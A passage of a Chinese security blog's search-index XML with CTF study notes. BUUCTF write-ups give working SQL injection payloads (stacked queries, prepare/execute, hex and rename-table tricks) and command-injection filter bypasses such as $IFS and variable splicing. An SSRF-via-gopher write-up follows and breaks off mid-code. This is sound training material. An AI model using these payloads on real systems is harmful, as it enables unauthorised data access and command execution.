&#x27;&lt;用户名&gt;&#x27;@&#x27;%&#x27;;#分配权限<br>FLUSH PRIVILEGES;#刷新权限<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2023/03/28/DVWA/"/>
    <url>/2023/03/28/DVWA/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建DVWA靶场"><a href="#搭建DVWA靶场" class="headerlink" title="搭建DVWA靶场"></a>搭建DVWA靶场</h1><h2 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h2><p>(1)<a href="https://blog.csdn.net/qq_44803335/article/details/108806851">本地配置好php环境</a></p><p>(2)下载DVWA源码：<a href="https://github.com/digininja/DVWA/archive/master.zip">https://github.com/digininja/DVWA/archive/master.zip</a></p><h2 id="具体步骤："><a href="#具体步骤：" class="headerlink" title="具体步骤："></a>具体步骤：</h2><p>1、下载并安装PHPstudy；</p><p>2、将解压后的DVWA源码放置在phpstudy安装目录的WWW文件夹；</p><p><img src="/2023/03/28/DVWA/image-20230406231241712.png"></p><p>3.进入DVWA&#x2F;config目录，将config.inc.php.dist最后的.dist删去；</p><p>4、打开刚刚重命名的config.inc.php文件，修改db_user和db_password为”root”、”root”；</p><p><img src="/2023/03/28/DVWA/image-20230406231943662.png"></p><p>5、PHPstudy中启动服务器，访问<a href="http://127.0.0.1/DVWA/setup.php">http://127.0.0.1/DVWA/setup.php</a>(或<a href="http://localhost/DVWA/setup.php">http://localhost/DVWA/setup.php)</a>)点击最下方的Creat Database；</p><p><img src="/2023/03/28/DVWA/image-20230406232851826.png"></p><p>如图所示就算启动成功了。</p><p>6、访问<a href="http://127.0.0.1/DVWA/">http://127.0.0.1/DVWA/</a>(或<a href="http://localhost/DVWA/">http://localhost/DVWA/)</a>)，输入用户名”admin”密码”password”登录即可</p><h1 id="DVWA靶场学习记录"><a href="#DVWA靶场学习记录" class="headerlink" title="DVWA靶场学习记录"></a>DVWA靶场学习记录</h1>]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>自建靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit</title>
    <link href="/2023/03/28/Metasploit/"/>
    <url>/2023/03/28/Metasploit/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>渗透工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF</title>
    <link href="/2023/03/11/NSSCTF/"/>
    <url>/2023/03/11/NSSCTF/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2023/03/09/BUUCTF/"/>
    <url>/2023/03/09/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-Writeup"><a href="#BUUCTF-Writeup" class="headerlink" title="BUUCTF  Writeup"></a><em>BUUCTF  Writeup</em></h1><h2 id="EasySql"><a href="#EasySql" class="headerlink" title="EasySql"></a>EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p><p><img src="/2023/03/09/BUUCTF/image-20230213012236141.png"></p><p>密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。</p><p><img src="/2023/03/09/BUUCTF/image-20230213013114976.png"></p><p>准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。</p><p><img src="/2023/03/09/BUUCTF/image-20230213013848916.png"></p><p>题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*<strong>导致后端查询语句变成</strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’  or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分：</p><p><em><strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’</strong></em> 和</p><p><em><strong>or (ascii(substr(database(),0,1))&lt;128)#’</strong></em></p><p>虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag；</p><p>但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1&#x3D;1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。</p><hr><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>先传入1，返回一个字符串，传入1’，报错</p><p><img src="/2023/03/09/BUUCTF/image-20230213133221152.png"></p><p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/03/09/BUUCTF/image-20230213140043405.png"></p><p>传入***’ order by 3#<em><strong>，报错。传入</strong></em>‘ order by 2#***不报错，判断表里有2个字段。</p><p><img src="/2023/03/09/BUUCTF/image-20230213140715876.png"></p><p>联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">//依次将s改为e,l,e,c,t</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>)==<span class="hljs-variable">$var</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;^&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>得到select，尝试能否绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;.&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;1&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%3C&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%2B&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还是没绕过，暂时放弃这条路。</p><p><img src="/2023/03/09/BUUCTF/image-20230213143545653.png"></p><p>查找学习show databases爆数据库名。<img src="/2023/03/09/BUUCTF/image-20230213144232143.png"></p><p>show tables爆表名，好臭的表名啊(。</p><p><img src="/2023/03/09/BUUCTF/image-20230213144433988.png"></p><p>‘; show columns from <code>1919810931114514</code>;#爆字段名（表名要用反引号引起来，typora里不知道为什么吞反引号）</p><p><img src="/2023/03/09/BUUCTF/image-20230213144916052.png"></p><p>万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] open;#打开表（句柄）<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] read first;#从表的第一列开始读（指针的起点）<br>handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137）<br></code></pre></td></tr></table></figure><p>最终构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213152804918.png"></p><p>拿到flag。</p><p>反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。</p><p>预编译相关语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set : #设置变量；<br>prepare : #准备一个语句赋予其名称，之后直接调用语句；<br>execute :#执行语句；<br></code></pre></td></tr></table></figure><p>以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。</p><p>步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel;#执行sel语句；<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213160841525.png"></p><p>然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213161126295.png"></p><p>十六进制绕过的步骤如下：</p><p>打开mysql命令行输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select hex(&quot;select * from `191981096114514`&quot;);<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213162154710.png"></p><p>得到一串十六进制字符串。</p><p>构造预处理语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p>set同样大写绕过，payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;Set @abc=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是<span class="hljs-number">19198109311451</span>4打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213163140720.png"></p><p>GET到flag；</p><p>另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213164015355.png"></p><p>推测回显内容来自于data字段；</p><p>思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1&#x3D;1#***使查询结果为true爆出words所有字段内容。</p><p>相关语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table [表名] add [字段名] int(***)/varchar(***) #增加列<br>alter table [表名] drop [字段名]#删除列<br>alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段<br>alter table [表名] rename to [新表名]#重命名表,to可省略<br>rename table [表名] to [新表名]#重命名表<br></code></pre></td></tr></table></figure><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id<br></code></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);#<br>#修改flag字段名为id<br></code></pre></td></tr></table></figure><hr><h2 id="PingPingPing"><a href="#PingPingPing" class="headerlink" title="PingPingPing"></a>PingPingPing</h2><p>做这道题时想到前面做过的另外一题（新生赛exec）。总结了以下联合执行的符号作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">p1;p2:<span class="hljs-string">&quot;先执行p1后执行p2;</span><br><span class="hljs-string">p1|p2:p1的输出作为p2的输入，只显示p2的结果；</span><br><span class="hljs-string">p1||p2:若p1为假则执行p2，为真停止执行；</span><br><span class="hljs-string">p1&amp;&amp;p2:若p1为真则执行p2，为假停止执行；</span><br></code></pre></td></tr></table></figure><p>传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=| ls<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214021610128.png"></p><p>说实话一开始没反应过来space是空格的意思就没想着空格被过滤了（，单纯以为是表达错误不需要空格然后把空格删掉发现可以执行,直到下面cat命令没法正常执行时才反应过来是空格被ban了（。</p><p>提示空格被ban了，传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=|ls<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=;ls<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214021933333.png"></p><p>回显提示目录里有flag.php和index.php</p><p>直接</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=|cat flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214022139800.png"></p><p>然后提示空格被ban了。参考了大佬们的博客，大佬总结了以下几点绕过空格的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;IFS&#125;$<span class="hljs-number">9</span><br>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><br>$&#123;IFS&#125;<br>$IFS$<span class="hljs-number">1</span> <span class="hljs-comment">//$1改成$加其他数字貌似都行</span><br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  <span class="hljs-comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br>%<span class="hljs-number">20</span>   (space)<br>%<span class="hljs-number">09</span>   (tab)<br>X=$<span class="hljs-string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="hljs-variable">$X</span>       （\x09表示tab，也可以用\x20）<br><span class="hljs-comment">#来自大佬博客：https://blog.csdn.net/vanarrow/article/details/108295481</span><br><br></code></pre></td></tr></table></figure><p>逐一试下来发现$IFS$1是可行的但是提示flag被ban了（悲）</p><p><img src="/2023/03/09/BUUCTF/image-20230214023158094.png"></p><p>既然看不了flag又不知道过滤规则，反正还有个index.php能看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=|<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1index</span>.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214023326732.png"></p><p>密密麻麻的这么多都被过滤了，括号引号星号全员过滤。。。想起之前从学长那里学来的星号绕过，也不能用了，没有头绪的时候。</p><p>正巧刚刚在学习绕过空格过滤的时候看到一篇博客，<a href="https://www.cnblogs.com/GLory-LTF/p/15359485.html%E3%80%82%E9%87%8C%E9%9D%A2%E6%9C%89%E8%AE%B2%E5%88%B0%E5%A6%82%E6%9E%9Ccat%E5%AD%97%E7%AC%A6%E8%A2%ABban%E4%BA%86%E4%BD%86%E6%98%AF%E9%9D%9E%E5%BE%97%E7%94%A8cat%E5%91%BD%E4%BB%A4%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8B%E7%BB%8D%E4%BA%86%E4%B8%80%E7%A7%8D%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%EF%BC%88%E8%AE%B0%E5%B0%8F%E6%9C%AC%E6%9C%AC%EF%BC%89%E3%80%82">https://www.cnblogs.com/GLory-LTF/p/15359485.html。里面有讲到如果cat字符被ban了但是非得用cat命令，这里介绍了一种命令拼接绕过（记小本本）。</a></p><p>理论知道了，开始实践</p><p><img src="/2023/03/09/BUUCTF/image-20230214025001351.png"></p><p>嗯。。属于是学了点知识不会灵活变通了，再次求助大佬，给出的payload是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><p>又有收获了，拼接绕过不一定要每个字母都拼接，看着这个payload有个想法，如果把$a的位置在flag四个位置改变会怎么样。实践。</p><p><img src="/2023/03/09/BUUCTF/image-20230214025741500.png"></p><p>替换字符f的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214025844260.png"></p><p>替换字符l的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214025933119.png"></p><p>替换字符a的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214030039533.png"></p><p>看来只有g的位置可以。然后注意到$a是代码中原有的变量，如果构造payload时用的是b变量会怎么样呢</p><p><img src="/2023/03/09/BUUCTF/image-20230214030227918.png"></p><p>也是可行的</p>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ROIS冬令营</title>
    <link href="/2023/02/10/ROIS/"/>
    <url>/2023/02/10/ROIS/</url>
    
    <content type="html"><![CDATA[<h1 id="2023ROIS冬令营"><a href="#2023ROIS冬令营" class="headerlink" title="2023ROIS冬令营"></a>2023ROIS冬令营</h1><p>梦开始的地方。。。。。。</p><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h3><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/10/ROIS/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/10/ROIS/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/10/ROIS/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span 